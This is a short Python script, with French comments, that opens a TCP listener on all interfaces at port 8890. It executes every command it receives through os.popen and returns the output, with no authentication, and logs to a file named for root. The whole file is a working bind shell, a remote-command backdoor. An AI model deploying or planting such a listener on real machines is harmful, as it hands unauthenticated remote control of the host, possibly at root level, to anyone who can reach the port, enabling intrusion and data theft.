import socket
import os
import logging

# Configuration du logging
logging.basicConfig(filename='/tmp/listener_root.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def start_listener(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', port))
        s.listen(1)
        logging.info(f"Listening on port {port}")
        conn, addr = s.accept()
        with conn:
            logging.info(f"Connected by {addr}")
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                command = data.decode().strip()
                logging.info(f"Received command: {command}")
                if command == "exit":
                    break
                try:
                    output = os.popen(command).read()
                    conn.sendall(output.encode())
                except Exception as e:
                    conn.sendall(f"Error executing command: {e}".encode())

if __name__ == "__main__":
    start_listener(8890)
